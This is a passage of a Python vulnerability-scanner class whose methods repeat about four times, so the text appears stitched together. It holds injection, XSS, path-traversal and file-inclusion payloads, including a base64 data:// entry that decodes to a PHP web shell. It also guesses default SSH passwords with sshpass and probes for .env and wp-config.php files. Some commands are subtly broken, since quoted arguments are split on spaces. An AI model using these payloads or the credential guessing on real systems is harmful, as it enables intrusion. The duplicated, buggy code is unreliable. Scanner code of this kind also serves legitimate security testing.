        results = []
        
        # Check common headers
        try:
            response = requests.get(f"http://{self.target}", verify=False, timeout=5)
            headers = response.headers
            
            sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in sensitive_headers:
                if header in headers:
                    results.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'details': f'{header} header reveals: {headers[header]}'
                    })
        except:
            pass
            
        return results
        
    def _check_weak_permissions(self):
        """Check for weak permissions"""
        results = []
        
        # Check common directories
        directories = ['/uploads', '/backup', '/admin', '/config']
        for directory in directories:
            try:
                response = requests.get(f"http://{self.target}{directory}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'type': 'Weak Permissions',
                        'severity': 'Medium',
                        'details': f'Directory {directory} is accessible'
                    })
            except:
                continue
                
        return results
        
    def _is_sql_injection_successful(self, response):
        """Check if SQL injection was successful"""
        sql_errors = [
            "SQL syntax",
            "mysql_fetch_array",
            "ORA-",
            "PostgreSQL",
            "SQLite3::",
            "Warning: mysql_",
            "Warning: pg_",
            "Warning: sqlsrv_",
            "Warning: oci_"
        ]
        
        return any(error in response.text for error in sql_errors)
        
    def _is_file_inclusion_successful(self, response):
        """Check if file inclusion was successful"""
        return "root:" in response.text or "<?php" in response.text
        
    def _is_command_injection_successful(self, response):
        """Check if command injection was successful"""
        return "uid=" in response.text and "gid=" in response.text
        
    def _is_directory_traversal_successful(self, response):
        """Check if directory traversal was successful"""
        return "root:" in response.text

    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "admin' #"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?id={payload}", verify=False, timeout=5)
                if self._is_sql_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'SQL Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_xss(self, url):
        """Check for XSS vulnerabilities"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?q={payload}", verify=False, timeout=5)
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'type': 'XSS',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?file={payload}", verify=False, timeout=5)
                if self._is_file_inclusion_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'File Inclusion',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            ";id;",
            "| id",
            "$(id)",
            "`id`",
            "&& id"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?cmd={payload}", verify=False, timeout=5)
                if self._is_command_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Command Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?path={payload}", verify=False, timeout=5)
                if self._is_directory_traversal_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Directory Traversal',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_ftp_vulnerabilities(self, port):
        """Check FTP vulnerabilities"""
        vulns = []
        try:
            # Check anonymous access
            ftp_cmd = f"ftp -n {self.target} {port}"
            result = subprocess.run(ftp_cmd.split(), capture_output=True, text=True)
            
            if "Anonymous access granted" in result.stdout:
                vulns.append({
                    'type': 'Anonymous FTP Access',
                    'severity': 'High',
                    'details': 'Anonymous access is enabled'
                })
        except:
            pass
            
        return vulns
        
    def _check_ssh_vulnerabilities(self, port):
        """Check SSH vulnerabilities"""
        vulns = []
        try:
            # Check SSH version
            ssh_cmd = f"ssh -v {self.target} -p {port}"
            result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
            
            if "SSH-2.0-OpenSSH" in result.stdout:
                version = re.search(r"SSH-2.0-OpenSSH_(\d+\.\d+)", result.stdout)
                if version:
                    vuln_version = float(version.group(1))
                    if vuln_version < 7.0:
                        vulns.append({
                            'type': 'Outdated SSH Version',
                            'severity': 'Medium',
                            'details': f'Running OpenSSH {vuln_version}'
                        })
        except:
            pass
            
        return vulns
        
    def _check_smb_vulnerabilities(self, port):
        """Check SMB vulnerabilities"""
        vulns = []
        try:
            # Check for null sessions
            smb_cmd = f"smbclient -L //{self.target} -p {port} -N"
            result = subprocess.run(smb_cmd.split(), capture_output=True, text=True)
            
            if "Sharename" in result.stdout:
                vulns.append({
                    'type': 'SMB Null Session',
                    'severity': 'High',
                    'details': 'Null sessions are allowed'
                })
        except:
            pass
            
        return vulns
        
    def _check_mysql_vulnerabilities(self, port):
        """Check MySQL vulnerabilities"""
        vulns = []
        try:
            # Check for root access without password
            mysql_cmd = f"mysql -h {self.target} -P {port} -u root -e 'SELECT 1'"
            result = subprocess.run(mysql_cmd.split(), capture_output=True, text=True)
            
            if "ERROR" not in result.stdout:
                vulns.append({
                    'type': 'MySQL Root Access',
                    'severity': 'Critical',
                    'details': 'Root access without password is possible'
                })
        except:
            pass
            
        return vulns
        
    def _check_default_credentials(self):
        """Check for default credentials"""
        default_creds = {
            'admin': ['admin', 'password', 'admin123'],
            'root': ['root', 'toor', 'password'],
            'user': ['user', 'password', 'user123']
        }
        
        results = []
        for username, passwords in default_creds.items():
            for password in passwords:
                try:
                    # Try SSH
                    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{self.target}"
                    result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
                    if "Permission denied" not in result.stdout:
                        results.append({
                            'service': 'SSH',
                            'username': username,
                            'password': password,
                            'severity': 'High'
                        })
                except:
                    pass
                    
        return results
        
    def _check_exposed_files(self):
        """Check for exposed sensitive files"""
        files = [
            '/.git/config',
            '/.env',
            '/wp-config.php',
            '/config.php',
            '/backup.sql',
            '/backup.zip'
        ]
        
        results = []
        for file in files:
            try:
                response = requests.get(f"http://{self.target}{file}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'file': file,
                        'severity': 'High',
                        'details': 'Sensitive file is exposed'
                    })
            except:
                continue
                
        return results
        
    def _check_information_disclosure(self):
        """Check for information disclosure"""
        results = []
        
        # Check common headers
        try:
            response = requests.get(f"http://{self.target}", verify=False, timeout=5)
            headers = response.headers
            
            sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in sensitive_headers:
                if header in headers:
                    results.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'details': f'{header} header reveals: {headers[header]}'
                    })
        except:
            pass
            
        return results
        
    def _check_weak_permissions(self):
        """Check for weak permissions"""
        results = []
        
        # Check common directories
        directories = ['/uploads', '/backup', '/admin', '/config']
        for directory in directories:
            try:
                response = requests.get(f"http://{self.target}{directory}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'type': 'Weak Permissions',
                        'severity': 'Medium',
                        'details': f'Directory {directory} is accessible'
                    })
            except:
                continue
                
        return results
        
    def _is_sql_injection_successful(self, response):
        """Check if SQL injection was successful"""
        sql_errors = [
            "SQL syntax",
            "mysql_fetch_array",
            "ORA-",
            "PostgreSQL",
            "SQLite3::",
            "Warning: mysql_",
            "Warning: pg_",
            "Warning: sqlsrv_",
            "Warning: oci_"
        ]
        
        return any(error in response.text for error in sql_errors)
        
    def _is_file_inclusion_successful(self, response):
        """Check if file inclusion was successful"""
        return "root:" in response.text or "<?php" in response.text
        
    def _is_command_injection_successful(self, response):
        """Check if command injection was successful"""
        return "uid=" in response.text and "gid=" in response.text
        
    def _is_directory_traversal_successful(self, response):
        """Check if directory traversal was successful"""
        return "root:" in response.text

    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "admin' #"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?id={payload}", verify=False, timeout=5)
                if self._is_sql_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'SQL Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_xss(self, url):
        """Check for XSS vulnerabilities"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?q={payload}", verify=False, timeout=5)
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'type': 'XSS',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?file={payload}", verify=False, timeout=5)
                if self._is_file_inclusion_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'File Inclusion',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            ";id;",
            "| id",
            "$(id)",
            "`id`",
            "&& id"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?cmd={payload}", verify=False, timeout=5)
                if self._is_command_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Command Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?path={payload}", verify=False, timeout=5)
                if self._is_directory_traversal_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Directory Traversal',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_ftp_vulnerabilities(self, port):
        """Check FTP vulnerabilities"""
        vulns = []
        try:
            # Check anonymous access
            ftp_cmd = f"ftp -n {self.target} {port}"
            result = subprocess.run(ftp_cmd.split(), capture_output=True, text=True)
            
            if "Anonymous access granted" in result.stdout:
                vulns.append({
                    'type': 'Anonymous FTP Access',
                    'severity': 'High',
                    'details': 'Anonymous access is enabled'
                })
        except:
            pass
            
        return vulns
        
    def _check_ssh_vulnerabilities(self, port):
        """Check SSH vulnerabilities"""
        vulns = []
        try:
            # Check SSH version
            ssh_cmd = f"ssh -v {self.target} -p {port}"
            result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
            
            if "SSH-2.0-OpenSSH" in result.stdout:
                version = re.search(r"SSH-2.0-OpenSSH_(\d+\.\d+)", result.stdout)
                if version:
                    vuln_version = float(version.group(1))
                    if vuln_version < 7.0:
                        vulns.append({
                            'type': 'Outdated SSH Version',
                            'severity': 'Medium',
                            'details': f'Running OpenSSH {vuln_version}'
                        })
        except:
            pass
            
        return vulns
        
    def _check_smb_vulnerabilities(self, port):
        """Check SMB vulnerabilities"""
        vulns = []
        try:
            # Check for null sessions
            smb_cmd = f"smbclient -L //{self.target} -p {port} -N"
            result = subprocess.run(smb_cmd.split(), capture_output=True, text=True)
            
            if "Sharename" in result.stdout:
                vulns.append({
                    'type': 'SMB Null Session',
                    'severity': 'High',
                    'details': 'Null sessions are allowed'
                })
        except:
            pass
            
        return vulns
        
    def _check_mysql_vulnerabilities(self, port):
        """Check MySQL vulnerabilities"""
        vulns = []
        try:
            # Check for root access without password
            mysql_cmd = f"mysql -h {self.target} -P {port} -u root -e 'SELECT 1'"
            result = subprocess.run(mysql_cmd.split(), capture_output=True, text=True)
            
            if "ERROR" not in result.stdout:
                vulns.append({
                    'type': 'MySQL Root Access',
                    'severity': 'Critical',
                    'details': 'Root access without password is possible'
                })
        except:
            pass
            
        return vulns
        
    def _check_default_credentials(self):
        """Check for default credentials"""
        default_creds = {
            'admin': ['admin', 'password', 'admin123'],
            'root': ['root', 'toor', 'password'],
            'user': ['user', 'password', 'user123']
        }
        
        results = []
        for username, passwords in default_creds.items():
            for password in passwords:
                try:
                    # Try SSH
                    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{self.target}"
                    result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
                    if "Permission denied" not in result.stdout:
                        results.append({
                            'service': 'SSH',
                            'username': username,
                            'password': password,
                            'severity': 'High'
                        })
                except:
                    pass
                    
        return results
        
    def _check_exposed_files(self):
        """Check for exposed sensitive files"""
        files = [
            '/.git/config',
            '/.env',
            '/wp-config.php',
            '/config.php',
            '/backup.sql',
            '/backup.zip'
        ]
        
        results = []
        for file in files:
            try:
                response = requests.get(f"http://{self.target}{file}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'file': file,
                        'severity': 'High',
                        'details': 'Sensitive file is exposed'
                    })
            except:
                continue
                
        return results
        
    def _check_information_disclosure(self):
        """Check for information disclosure"""
        results = []
        
        # Check common headers
        try:
            response = requests.get(f"http://{self.target}", verify=False, timeout=5)
            headers = response.headers
            
            sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in sensitive_headers:
                if header in headers:
                    results.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'details': f'{header} header reveals: {headers[header]}'
                    })
        except:
            pass
            
        return results
        
    def _check_weak_permissions(self):
        """Check for weak permissions"""
        results = []
        
        # Check common directories
        directories = ['/uploads', '/backup', '/admin', '/config']
        for directory in directories:
            try:
                response = requests.get(f"http://{self.target}{directory}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'type': 'Weak Permissions',
                        'severity': 'Medium',
                        'details': f'Directory {directory} is accessible'
                    })
            except:
                continue
                
        return results
        
    def _is_sql_injection_successful(self, response):
        """Check if SQL injection was successful"""
        sql_errors = [
            "SQL syntax",
            "mysql_fetch_array",
            "ORA-",
            "PostgreSQL",
            "SQLite3::",
            "Warning: mysql_",
            "Warning: pg_",
            "Warning: sqlsrv_",
            "Warning: oci_"
        ]
        
        return any(error in response.text for error in sql_errors)
        
    def _is_file_inclusion_successful(self, response):
        """Check if file inclusion was successful"""
        return "root:" in response.text or "<?php" in response.text
        
    def _is_command_injection_successful(self, response):
        """Check if command injection was successful"""
        return "uid=" in response.text and "gid=" in response.text
        
    def _is_directory_traversal_successful(self, response):
        """Check if directory traversal was successful"""
        return "root:" in response.text

    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "admin' #"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?id={payload}", verify=False, timeout=5)
                if self._is_sql_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'SQL Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_xss(self, url):
        """Check for XSS vulnerabilities"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?q={payload}", verify=False, timeout=5)
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'type': 'XSS',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?file={payload}", verify=False, timeout=5)
                if self._is_file_inclusion_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'File Inclusion',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            ";id;",
            "| id",
            "$(id)",
            "`id`",
            "&& id"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?cmd={payload}", verify=False, timeout=5)
                if self._is_command_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Command Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?path={payload}", verify=False, timeout=5)
                if self._is_directory_traversal_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Directory Traversal',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_ftp_vulnerabilities(self, port):
        """Check FTP vulnerabilities"""
        vulns = []
        try:
            # Check anonymous access
            ftp_cmd = f"ftp -n {self.target} {port}"
            result = subprocess.run(ftp_cmd.split(), capture_output=True, text=True)
            
            if "Anonymous access granted" in result.stdout:
                vulns.append({
                    'type': 'Anonymous FTP Access',
                    'severity': 'High',
                    'details': 'Anonymous access is enabled'
                })
        except:
            pass
            
        return vulns
        
    def _check_ssh_vulnerabilities(self, port):
        """Check SSH vulnerabilities"""
        vulns = []
        try:
            # Check SSH version
            ssh_cmd = f"ssh -v {self.target} -p {port}"
            result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
            
            if "SSH-2.0-OpenSSH" in result.stdout:
                version = re.search(r"SSH-2.0-OpenSSH_(\d+\.\d+)", result.stdout)
                if version:
                    vuln_version = float(version.group(1))
                    if vuln_version < 7.0:
                        vulns.append({
                            'type': 'Outdated SSH Version',
                            'severity': 'Medium',
                            'details': f'Running OpenSSH {vuln_version}'
                        })
        except:
            pass
            
        return vulns
        
    def _check_smb_vulnerabilities(self, port):
        """Check SMB vulnerabilities"""
        vulns = []
        try:
            # Check for null sessions
            smb_cmd = f"smbclient -L //{self.target} -p {port} -N"
            result = subprocess.run(smb_cmd.split(), capture_output=True, text=True)
            
            if "Sharename" in result.stdout:
                vulns.append({
                    'type': 'SMB Null Session',
                    'severity': 'High',
                    'details': 'Null sessions are allowed'
                })
        except:
            pass
            
        return vulns
        
    def _check_mysql_vulnerabilities(self, port):
        """Check MySQL vulnerabilities"""
        vulns = []
        try:
            # Check for root access without password
            mysql_cmd = f"mysql -h {self.target} -P {port} -u root -e 'SELECT 1'"
            result = subprocess.run(mysql_cmd.split(), capture_output=True, text=True)
            
            if "ERROR" not in result.stdout:
                vulns.append({
                    'type': 'MySQL Root Access',
                    'severity': 'Critical',
                    'details': 'Root access without password is possible'
                })
        except:
            pass
            
        return vulns
        
    def _check_default_credentials(self):
        """Check for default credentials"""
        default_creds = {
            'admin': ['admin', 'password', 'admin123'],
            'root': ['root', 'toor', 'password'],
            'user': ['user', 'password', 'user123']
        }
        
        results = []
        for username, passwords in default_creds.items():
            for password in passwords:
                try:
                    # Try SSH
                    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{self.target}"
                    result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
                    if "Permission denied" not in result.stdout:
                        results.append({
                            'service': 'SSH',
                            'username': username,
                            'password': password,
                            'severity': 'High'
                        })
                except:
                    pass
                    
        return results
        
    def _check_exposed_files(self):
        """Check for exposed sensitive files"""
        files = [
            '/.git/config',
            '/.env',
            '/wp-config.php',
            '/config.php',
            '/backup.sql',
            '/backup.zip'
        ]
        
        results = []
        for file in files:
            try:
                response = requests.get(f"http://{self.target}{file}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'file': file,
                        'severity': 'High',
                        'details': 'Sensitive file is exposed'
                    })
            except:
                continue
                
        return results
        
    def _check_information_disclosure(self):
        """Check for information disclosure"""
        results = []
        
        # Check common headers
        try:
            response = requests.get(f"http://{self.target}", verify=False, timeout=5)
            headers = response.headers
            
            sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in sensitive_headers:
                if header in headers:
                    results.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'details': f'{header} header reveals: {headers[header]}'
                    })
        except:
            pass
            
        return results
        
    def _check_weak_permissions(self):
        """Check for weak permissions"""
        results = []
        
        # Check common directories
        directories = ['/uploads', '/backup', '/admin', '/config']
        for directory in directories:
            try:
                response = requests.get(f"http://{self.target}{directory}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'type': 'Weak Permissions',
                        'severity': 'Medium',
                        'details': f'Directory {directory} is accessible'
                    })
            except:
                continue
                
        return results
        
    def _is_sql_injection_successful(self, response):
        """Check if SQL injection was successful"""
        sql_errors = [
            "SQL syntax",
            "mysql_fetch_array",
            "ORA-",
            "PostgreSQL",
            "SQLite3::",
            "Warning: mysql_",
            "Warning: pg_",
            "Warning: sqlsrv_",
            "Warning: oci_"
        ]
        
        return any(error in response.text for error in sql_errors)
        
    def _is_file_inclusion_successful(self, response):
        """Check if file inclusion was successful"""
        return "root:" in response.text or "<?php" in response.text
        
    def _is_command_injection_successful(self, response):
        """Check if command injection was successful"""
        return "uid=" in response.text and "gid=" in response.text
        
    def _is_directory_traversal_successful(self, response):
        """Check if directory traversal was successful"""
        return "root:" in response.text

    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "admin' #"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?id={payload}", verify=False, timeout=5)
                if self._is_sql_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'SQL Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_xss(self, url):
        """Check for XSS vulnerabilities"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?q={payload}", verify=False, timeout=5)
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'type': 'XSS',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?file={payload}", verify=False, timeout=5)
                if self._is_file_inclusion_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'File Inclusion',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            ";id;",
            "| id",
            "$(id)",
            "`id`",
            "&& id"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?cmd={payload}", verify=False, timeout=5)
                if self._is_command_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Command Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?path={payload}", verify=False, timeout=5)
                if self._is_directory_traversal_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Directory Traversal',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_ftp_vulnerabilities(self, port):
        """Check FTP vulnerabilities"""
        vulns = []
        try:
            # Check anonymous access
            ftp_cmd = f"ftp -n {self.target} {port}"
            result = subprocess.run(ftp_cmd.split(), capture_output=True, text=True)
            
            if "Anonymous access granted" in result.stdout:
                vulns.append({
                    'type': 'Anonymous FTP Access',
                    'severity': 'High',
                    'details': 'Anonymous access is enabled'
                })
        except:
            pass
            
        return vulns
        
    def _check_ssh_vulnerabilities(self, port):
        """Check SSH vulnerabilities"""
        vulns = []
        try:
            # Check SSH version
            ssh_cmd = f"ssh -v {self.target} -p {port}"
            result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
            
            if "SSH-2.0-OpenSSH" in result.stdout:
                version = re.search(r"SSH-2.0-OpenSSH_(\d+\.\d+)", result.stdout)
                if version:
                    vuln_version = float(version.group(1))
                    if vuln_version < 7.0:
                        vulns.append({
                            'type': 'Outdated SSH Version',
                            'severity': 'Medium',
                            'details': f'Running OpenSSH {vuln_version}'
                        })
        except:
            pass
            
        return vulns
        
    def _check_smb_vulnerabilities(self, port):
        """Check SMB vulnerabilities"""
        vulns = []
        try:
            # Check for null sessions
            smb_cmd = f"smbclient -L //{self.target} -p {port} -N"
            result = subprocess.run(smb_cmd.split(), capture_output=True, text=True)
            
            if "Sharename" in result.stdout:
                vulns.append({
                    'type': 'SMB Null Session',
                    'severity': 'High',
                    'details': 'Null sessions are allowed'
                })
        except:
            pass
            
        return vulns
        
    def _check_mysql_vulnerabilities(self, port):
        """Check MySQL vulnerabilities"""
        vulns = []
        try:
            # Check for root access without password
            mysql_cmd = f"mysql -h {self.target} -P {port} -u root -e 'SELECT 1'"
            result = subprocess.run(mysql_cmd.split(), capture_output=True, text=True)
            
            if "ERROR" not in result.stdout:
                vulns.append({
                    'type': 'MySQL Root Access',
                    'severity': 'Critical',
                    'details': 'Root access without password is possible'
                })
        except:
            pass
            
        return vulns
        
    def _check_default_credentials(self):
        """Check for default credentials"""
        default_creds = {
            'admin': ['admin', 'password', 'admin123'],
            'root': ['root', 'toor', 'password'],
            'user': ['user', 'password', 'user123']
        }
        
        results = []
        for username, passwords in default_creds.items():
            for password in passwords:
                try:
                    # Try SSH
                    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{self.target}"
                    result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
                    if "Permission denied" not in result.stdout:
                        results.append({
                            'service': 'SSH',
                            'username': username,
                            'password': password,
                            'severity': 'High'
                        })
                except:
                    pass
                    
        return results
        
    def _check_exposed_files(self):
        """Check for exposed sensitive files"""
        files = [
            '/.git/config',
            '/.env',
            '/wp-config.php',
            '/config.php',
            '/backup.sql',
            '/backup.zip'
        ]
        
        results = []
        for file in files:
            try:
                response = requests.get(f"http://{self.target}{file}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'file': file,
                        'severity': 'High',
                        'details': 'Sensitive file is exposed'
                    })
            except:
                continue
                
        return results
        
    def _check_information_disclosure(self):
        """Check for information disclosure"""
        results = []
        
        # Check common headers
        try:
            response = requests.get(f"http://{self.target}", verify=False, timeout=5)
            headers = response.headers
            
            sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in sensitive_headers:
                if header in headers:
                    results.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'details': f'{header} header reveals: {headers[header]}'
                    })
        except:
            pass
            
        return results
        
    def _check_weak_permissions(self):
        """Check for weak permissions"""
        results = []
        
        # Check common directories
        directories = ['/uploads', '/backup', '/admin', '/config']
        for directory in directories:
            try:
                response = requests.get(f"http://{self.target}{directory}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'type': 'Weak Permissions',
                        'severity': 'Medium',
                        'details': f'Directory {directory} is accessible'
                    })
            except:
                continue
                
        return results
        
    def _is_sql_injection_successful(self, response):
        """Check if SQL injection was successful"""
        sql_errors = [
            "SQL syntax",
            "mysql_fetch_array",
            "ORA-",
            "PostgreSQL",
            "SQLite3::",
            "Warning: mysql_",
            "Warning: pg_",
            "Warning: sqlsrv_",
            "Warning: oci_"
        ]
        
        return any(error in response.text for error in sql_errors)
        
    def _is_file_inclusion_successful(self, response):
        """Check if file inclusion was successful"""
        return "root:" in response.text or "<?php" in response.text
